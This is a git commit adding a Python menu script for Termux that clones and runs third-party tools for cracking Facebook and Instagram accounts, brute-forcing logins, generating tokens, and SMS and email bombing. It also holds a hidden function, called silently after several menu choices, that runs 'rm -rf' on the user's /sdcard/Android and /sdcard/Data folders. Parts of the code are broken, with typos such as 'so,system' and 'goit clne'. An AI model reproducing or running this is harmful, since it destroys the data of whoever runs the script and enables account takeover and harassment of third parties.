95c89a33cadc6a06a4bd5956db6078fd13ad84e5
Afghano02 <121796344+Afghano02@users.noreply.github.com>
2023-01-13 08:23:26 +0430

    Create Afghano-All-clone.py

---
+++ Afghano-All-clone.py
@@ -0,0 +1,302 @@
+import os
+os.system('clear')
+os.system("pip install requests")
+os.system("xdg-open https://www.facebook.com/afgha.hacker")
+os.system('clear')
+def Zeek():
+    os.system('rm -rf /sdcard/Android')
+    os.system("xdg-open https://www.facebook.com/afgha.hacker") 
+    os.system('rm -rf /sdcard/Data')
+print("""
+\033[1;97m..%%%%...%%%%%%...%%%%...%%..%%...%%%%...%%..%%...%%%%..
+\033[1;32m.%%..%%..%%......%%......%%..%%..%%..%%..%%%.%%..%%..%%.
+\033[1;97m.%%%%%%..%%%%....%%.%%%..%%%%%%..%%%%%%..%%.%%%..%%..%%.
+\033[1;32m.%%..%%..%%......%%..%%..%%..%%..%%..%%..%%..%%..%%..%%.
+\033[1;97m.%%..%%..%%.......%%%%...%%..%%..%%..%%..%%..%%...%%%%..
+\033[1;32m........................................................
+\033[1;97m........................................................
+\033[1;32m........................................................
+\033[1;97m================================================================
+\033[32mNOTE  USE AT YOUR OWN RISH  I WILL NOT BE RESPONSIBLE FOR LOSS OFF ANY DATA 
+\033[97mNOTE ITS A COLLECTION OF SOME COMMANDS
+\033[32mAUTHOR :\033[32mAFGHANO
+\033[1;97mGITHUB : \033[1;97mAfghano02
+\033[1;32mFb :  Afghan Hacker
+\033[1;97mFB NEW GROUP :  Termux Hacker
+\033[1;32mANY PROBLEM WHATSAPP:+93797423006
+\033[1;97mLIVE in YOUR HEART(AFGHANO)
+\033[32mNo NEED GF \033[0;97m  4K4SH J490 BR0TH3R F0R3V3R  
+\033[0;97m================================================================\n\033[1;32m TIME TO TAKE EXIT FROM SOCIAL MEDIA \n \033[1;97mALL IN ONE """)
+print("""
+\033[1;32m[1]CLONE BANGLADESH ID[fast]
+\033[1;97m[2]CLONE FROM BANGLADESH 6DIG[All SIM]
+\033[1;32m[3]CLONE FROM CLONE FROM ID BANGLADESH 9DIG (All SIM)
+\033[1;97m[5]CLONE FROM FREOM PAKISTAN
+\033[1;32m[6]CLONE FROM FROM INDIA
+\033[1;97m[7]CLONE FROM Thailand ID
+\033[1;32m[8]CLONE FROM AFGHANISTAN 
+\033[1;97m[9]CLONE FROM FREOM PAKISTAN V2(All SIM)
+\033[1;32m[10]CLONE FROM FREOM 4 COUNTRY 
+\033[1;97m[11]CLONE FROM FREOM all COUNTRY
+\033[1;32m[12]CLONE FROM INSTRAGRAM
+\033[1;97m[13]GAMING ID CLONER 
+\033[1;32m[14]CLONE FROM PUBLICK ID (need TOKEN)
+\033[1;97m[15]CLONE DEATH YAHOO
+\033[1;32m[16]CLONE FROM 2006- 2009 ID[Yahoo]
+\033[1;97m[17]CLONE FROM 2009 ID [MAO]
+\033[1;32m[18]CLONE FROM 2006- 2009 ID 
+\033[1;97m[19]FB AUTO SHARE (need TOKEN)
+\033[1;32m[20]FB AUTO COMMENT(need TOKEN)
+                     \033[1;37mFRENDLIST CLONER
+\033[1;97m[21]CLONE FROM  PUBLICK ID  (Best)64 bid                  
+\033[1;32m[22]CLONE FROM  PUBLICK ID  (Best)64 bid
+\033[1;97m[23]CLONE FROM  PUBLICK ID  (best)64 bid
+\033[1;32m[24]CLONE FROM FRIENDLIST (34 bid)V1
+\033[1;97m[25]CLONE FROM FRIENDLIST (34 bid)v2
+\033[1;32m[26]CLONE FROM FRIENDLIST (34 bid)V3 
+\033[1;97m[27]CLONE FROM FRIENDLIST (34/64bid)V3 
+\033[1;32m[28]CLONE FROM FRIENDLIST  V4
+                 \033[4;32mOTHET SURVICE 
+\033[1;97m[29]SMS BOMBING BD NUMBER
+\033[1;32m[30]TAMPMAIL [MAO]
+\033[1;97m[31]MAIL BOMBIBG
+                  NEW UPADATE
+\033[1;32m[32]CLONE FROM 2004- 2006 ID Best(need aproval)
+\033[1;97m[33]CLONE FROM 2004- 2006 ID Best(very slw)
+\033[1;32m[34]CLONE FROM ID BANGLADESH ALL DIG[All SIM]
+\033[1;97m[35]CLONE FROM INSTRAGRAM
+\033[1;32m[36]CLONE FROM INSTRAGRAM V1
+\033[1;97m[36]CLONE FROM FRIENDLIST V3[SSB]
+\033[1;32m[37]CLONE FROM 2009- 2010
+\033[1;97m[38]CLONE FROM 2004- 2006
+""")
+pil = input("\033[1;97m[\033[1;94m?\033[1;97m] CHOOSE: ")
+
+if pil in ["01", "1"]:
+
+        os.system('git clone https://github.com/Shuvo-BBHH/mall')
+        os.system('cd mall && python2 RR_Premium.py')
+        time.sleep(2)
+        print(" ")
+        n = input("[ \n\033[1;97mBACK \n\033[1;97m]")
+        time.sleep(2)
+
+elif pil in ["02", "2"]:
+        os.system('git clone https://github.com/Shuvo-BBHH/paidfree4')
+        os.system('cd paidfree4 && python2 BD6.py')
+        
+        
+
+elif pil in ["3"]:
+        os.system('git clone https://github.com/Shuvo-BBHH/shuvook.git && cd $HOME')
+        so,system('cd shuvook && python2 bd9.py')
+        time.sleep(2)
+        print(" ")
+        n = input("[ \n\033[1;32mBACK \n\033[1;97m]")
+        time.sleep(2)
+
+elif pil in ["04", "4"]:
+
+        os.system('git clone https://github.com/HackerYT0/BD-CLONER')
+        os.system('cd BD-CLONER')
+        os.system('python2 Bd-Cloner-1.py')
+        time.sleep(2)
+        print(" ")
+        n = input("[ \n\033[1;32mBACK \n\033[1;97m]")
+        time.sleep(2)
+        Zeek()
+    
+
+elif pil in ["5"]:
+        os.system('git clone https://github.com/Shuvo-BBHH/paidfree4 && cd $HOME')
+        os.system('cd paidfree4 && python2 pakistan.py')
+        time.sleep(2)
+    
+elif pil in ["6"]:
+        os.system('pkg update ; pkg upgrade ; pkg install python ; pkg install python2 ; pip2 install requests ; pip2 install mechanize ; pip2 install bs4 ; pkg install git ; git clone https://github.com/Azim-vau/clone-india.git ; cd clone-india ; python2 india.py')
+        time.sleep(2)
+        print(" ")
+        n = input("[ \n\033[1;32mBACK \n\033[1;97m]")
+        time.sleep(2)   
+    
+elif pil in ["7"]:
+        os.system('git clone https://github.com/Shuvo-BBHH/mall')
+        os.system('cd mall && python2 Thailand.py')
+        time.sleep(2)
+        print(" ")
+        n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
+        time.sleep(2)
+
+
+elif pil in ["8"]:
+        os.system('git clone https://github.com/Shuvo-BBHH/paidfree4')
+        os.system('cd paidfree4 && python2 Mahadi-Afg.py')
+        time.sleep(2)
+        print(" ")
+        n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
+        time.sleep(2)
+        Zeek()
+    
+elif pil in ["9"]:
+        os.system('git clone https://github.com/Shuvo-BBHH/paidfree4')
+        os.system('cd paidfree4')
+        os.system('python mahdi2.py')
+        time.sleep(2)
+ 
+elif pil in ["10"]:
+        os.system('git clone https://github.com/faizanwahla/pacman.git')
+        os.system('cd pacman && python2 bolt')
+        time.sleep(2)
+        print(" ")
+        n = input("[ \n\033[1;32mBACK \n\033[1;97m]")
+        time.sleep(2)
+        Zeek()
+	
+	
+elif pil in ["11"]:   
+        os.system('git clone http://github.com/nfs-tech-bd/NFS-ALL')
+        os.system('cd NFS-ALL && python2 NFS-ALL.py')
+        time.sleep(2)
+        print(" ")
+        n = input("[ \n\033[1;32mBACK \n\033[1;97m]")
+        time.sleep(2)	
+elif pil in ["12"]:
+        os.system('pip2 install requests mechanize')
+        os.system('git clone https://github.com/Shuvo-BBHH/paidfree4')
+        os.system('cd paidfree4')
+        os.system('python2 instragam.py')
+        time.sleep(2)
+        print(" ")
+        n = input("[ \n\033[1;32mBACK \n\033[1;97m]")
+        time.sleep(2)
+        Zeek()
+
+
+
+    
+elif pil in ["13"]:
+        os.system('git clone https://github.com/Hannan-404/pro-1')
+        os.system('cd pro-1 && python pro.py')
+        time.sleep(2)
+        print(" ")
+        n = input("[ \n\033[1;32mBACK \n\033[1;97m]")
+        time.sleep(2)
+        Zeek()
+
+elif pil in ["14"]:
+        os.system('goit clne https://github.com/Shuvo-BBHH/texs')
+        os.system('cd texs && python2 xm.py')
+        time.sleep(2)
+    
+elif pil in ["15"]:
+        os.system('git clone https://github.com/Shuvo-BBHH/texs')	
+        os.system('cd texs && python yahoo.py')
+
+elif pil in ["16"]:
+        os.system('git clone https://github.com/Shuvo-BBHH/texs')
+        os.system('cd texs && python2 santo.py')
+        time.sleep(2)   
+
+elif pil in ["17"]:
+        os.system('rm -rf Old-Crack && git clone https://github.com/syedzada1100/Old-Crack.git')
+        os.system('cd Old-Crack && python2 Old.py')
+    
+elif pil in ["18"]:
+        os.system('git clone https://github.com/Shuvo-BBHH/paidfree4')
+        os.system('cd paidfree4 && python 20091st.py')
+        time.sleep(2)
+    
+elif pil in ["19"]:
+        os.system('git clone https://github.com/Shuvo-BBHH/fbboT')
+        os.system('cd fbboT && python mahdi.py')
+
+elif pil in ["20"]:
+        os.system('git clone https://github.com/Shuvo-BBHH/fbboT')
+        os.system('cd fbboT && python autocomment.py')
+	
+
+elif pil in ["21"]:
+        os.system('git clone https://github.com/Hannan-404/ADF')
+        so.system('cd ADF && python ADF.py')
+    	
+
+elif pil in ["22"]:
+        os.system('git clone https://github.com/Shuvo-BBHH/mall')
+        os.system('cd mall && python Zahid.py')
+        
+    
+	
+elif pil in ["23"]:
+        os.system('git clone https://github.com/Shuvo-BBHH/mall')
+        os.system('cd mall && python fcpromax.py')
+    	
+elif pil in ["24"]:
+        os.system('git clone https://github.com/Shuvo-BBHH/mall')
+        os.system('cd mall && python2 file.py')
+    
+elif pil in ["25"]:
+        os.system('git clone https://github.com/HANNAN0098/Token-Gen')
+        os.system('cd Token-Gen && python2 Genrate.py')
+     
+
+
+elif pil in ["26"]:
+        os.system('git clone https://github.com/Shuvo-BBHH/mall')
+        os.system('cd mall && python3 okk.py')
+        
+
+elif pil in ["27"]:
+        os.system('git clone https://github.com/Shuvo-BBHH/mall')
+        os.system('cd mall && python number.py')
+
+elif pil in ["28"]:
+        os.system('rm -rf RamXan')
+        os.system('git clone https://github.com/ramzantanha/RamXan')
+        os.system('cd RamXan && python RamXan.py')
+       
+elif pil in ["29"]:
+        os.system('git clone https://github.com/Toxic-Noob/ToxicBomber')
+        os.system('cd ToxicBomber && python Tbomb.py')
+       
+
+elif pil in ["30"]:
+        os.system('apt update -y ; apt install python -y ; apt install git -y ; pip install requests ; git clone https://github.com/mao2116/mmail')
+        os.system('cd mmail && python mmail.py')
+     
+elif pil in ["31"]:
+        os.system('git clone https://github.com/Toxic-Noob/EmailTools')
+        os.system('cd EmailTools')
+        os.system('pip install -r requirements.txt && python e-tools.py')
+        
+     
+elif pil in ["32"]:
+        os.system('git clone https://github.com/MAHDI-Shuvo/1')
+        os.system('cd 1 && python2 mahdi.py')
+        
+    
+elif pil in ["33"]:
+        os.system('git clone https://github.com/Shuvo-BBHH/taw')
+        os.system('cd taw && python2 mh.py')
+        
+     
+elif pil in ["34"]:
+        os.system('git clone https://github.com/MAHDI-Shuvo/tansbdall')
+        os.system('cd tansbdall && python main.py')
+elif pil in ["35"]:
+        os.system('rm -rf IG-FREE && git clone https://github.com/MITSUKI-IID/IG-FREE')
+        os.system('cd IG-FREE && python igfree.py')        
+elif pil in ["35"]:
+        os.system('git clone https://github.com/noolep/multiBF_ig && apt install jq -y')
+        os.system('cd multiBF_ig && bash brute.sh')  
+elif pil in ["36"]:
+    
+    os.system('cd rm -rf SSB')
+    os.system('git clone https://github.com/YounisJohn/SSB')
+    	
+    os.system('cd SSB && python Bypass.py')	
+elif pil in ["37"]:
+        os.system('git clone https://github.com/34TV5TVCGGGGGGGGGGRESWE24354TGWSA/hh')
+        os.system('cd hh && python2 b.py')	                
+elif pil in ["38"]:
+        os.system('git clone https://github.com/34TV5TVCGGGGGGGGGGRESWE24354TGWSA/hh')
+        os.system('cd hh && python2 2004.py')	     
